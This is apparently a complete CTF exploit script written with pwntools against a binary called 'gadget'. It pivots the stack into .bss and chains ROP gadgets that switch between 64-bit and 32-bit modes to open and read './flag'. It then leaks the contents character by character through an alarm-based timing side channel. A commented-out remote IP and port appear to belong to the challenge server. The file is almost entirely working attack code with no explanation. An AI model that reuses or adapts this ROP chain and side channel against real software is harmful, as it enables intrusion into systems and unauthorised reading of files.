from pwn import *
import time
import sys
import threading

context.arch = "amd64"
#context.log_level = "debug"

flag = {}
lock = threading.Lock()

# addrs
bss = 0x40c000
flag_ch_pos = bss+0x1500
fake_stack = bss+0x1000
fake_stack2 = bss+0x1100
fake_stack3 = bss+0x1200

# gadgets
retfq = 0x4011ec
retf = 0x4011ed
ret = 0x40312c
leave_ret = 0x7ffff7ffde52
pop_rsp_ppp_ret = 0x401730
pop_rdi_rbp = 0x401734
pop_rsi_r15_rbp = 0x401732
pop_rbp_ret = 0x401102
pop_rax_ret = 0x401001
pop_rcx_ret = 0x40117b
pop_rbx_ppp_ret = 0x403072
int_0x80_ret = 0x4011f3
syscall_ret = 0x408865
read_0xc0_gadget = 0x401170
push_rsi_ret = 0x4011c5
int3 = 0x4011eb

alarm_gadget = 0x40115D
'''
.text:000000000040115D                 mov     eax, 25h
.text:0000000000401162                 mov     edi, [rbp-8]    ; seconds
.text:0000000000401165                 syscall                 ; LINUX - sys_alarm
.text:0000000000401167                 pop     rbp
.text:0000000000401168                 retn
'''

def exp(curr_ch):
    # 121.37.135.138 2102
    #p = process("./gadget")
    # p = remote("121.37.135.138", 2102)
    p = process('./gadget')
    context.log_level = 'debug'
    
    #gdb.attach(p, "b *0x40119a\nc\n")
    offset = 0x38
    move_stack_payload = b"A"*0x38 + p64(pop_rdi_rbp) + p64(fake_stack)*2 + p64(read_0xc0_gadget)
    #move_stack_payload += p64(leave_ret) # start part1
    move_stack_payload += p64(pop_rsp_ppp_ret) + p64(fake_stack) # start part1
    p.send(move_stack_payload)
    
    # part 1
    time.sleep(1)
    bss_payload = b"./flag\x00\x00" # new rbp 
    bss_payload += p64(0)*2
    bss_payload += p64(retfq) + p64(ret) + p64(0x23) # change to x86
    
    bss_payload += p32(pop_rax_ret) + p32(5) # control eax to SYS_open
    bss_payload += p32(pop_rbx_ppp_ret) + p32(fake_stack) + p32(fake_stack)*3
    bss_payload += p32(pop_rcx_ret) + p32(0)
    bss_payload += p32(int_0x80_ret) # do SYS_open
    
    bss_payload += p32(ret) + p32(retf) + p32(ret) + p32(0x33) # change to x64

    bss_payload += p64(pop_rdi_rbp) + p64(fake_stack2)*2 + p64(read_0xc0_gadget) # read part2
    bss_payload += p64(pop_rsp_ppp_ret) + p64(fake_stack2)  # start part2
    
    #print("len(bss_payload):", hex(len(bss_payload)))  
    p.send(bss_payload)
    
    # part2
    time.sleep(1)
    bss_payload2 = p64(0xdeadbeef) # new rbp
    bss_payload2 += p64(0)*2
    bss_payload2 += p64(pop_rax_ret) + p64(0)  # control rax to SYS_read
    bss_payload2 += p64(pop_rdi_rbp) + p64(3) + p64(0xdeadbeef) # fd

    bss_payload2 += p64(pop_rsi_r15_rbp) + p64(flag_ch_pos-curr_ch) + p64(0)*2
    bss_payload2 += p64(syscall_ret) # do SYS_read
    bss_payload2 += p64(pop_rdi_rbp) + p64(flag_ch_pos+1) + p64(0) + p64(read_0xc0_gadget) # rewrite high bits
    
    bss_payload2 += p64(pop_rdi_rbp) + p64(fake_stack3)*2 + p64(read_0xc0_gadget) # read part3
    bss_payload2 += p64(pop_rsp_ppp_ret) + p64(fake_stack3)  # start part3
    
    #print("len(bss_payload2):", hex(len(bss_payload2)))  
    p.send(bss_payload2)
    
    # rewrite
    time.sleep(1)
    p.send(b"\x00"*0x7)
    #p.send(p64(7))
    
    # part3
    time.sleep(1)
    bss_payload3 = p64(0xdeadbeef) # new rbp
    bss_payload3 += p64(0)*2
    bss_payload3 += p64(pop_rbp_ret) + p64(flag_ch_pos+8)
    bss_payload3 += p64(alarm_gadget) # alarm gadget
    bss_payload3 += p64(0xdeadbeef) # padding
    
    bss_payload3 += p64(pop_rsi_r15_rbp) + p64(push_rsi_ret) + p64(0)*2
    bss_payload3 += p64(push_rsi_ret) # blocking

    #print("len(bss_payload3):", hex(len(bss_payload3)))  
    gdb.attach(p, '''b*0x40115D''')
    p.send(bss_payload3)
    
    start = time.time()
    for i in range(1000):
        try:
            p.send(b"a")
        except:
            end = time.time()
            time_used = int(end-start)
            print(f"[ROUND {curr_ch}] Time used:", end-start)
            print(f"[ROUND {curr_ch}] CHAR: '{chr(time_used)}' ({hex(time_used)})")
            lock.acquire()
            flag[curr_ch] = chr(time_used)
            lock.release()
            return
        finally:
            time.sleep(0.3)
    print(f"[ROUND {curr_ch}] ERROR")
    p.close()
    return

if __name__ == "__main__":
    pool = []
    for _round in range(1):
        th = threading.Thread(target=exp, args=(_round, ))
        th.setDaemon = True
        pool.append(th)
        th.start()
    for th in pool:
        th.join()
    flag = {k: v for k, v in sorted(flag.items(), key=lambda item: item[0])}    
    print(flag)
    flag_str = ""
    for k, v in flag.items():
        flag_str = flag_str + v
    print(flag_str)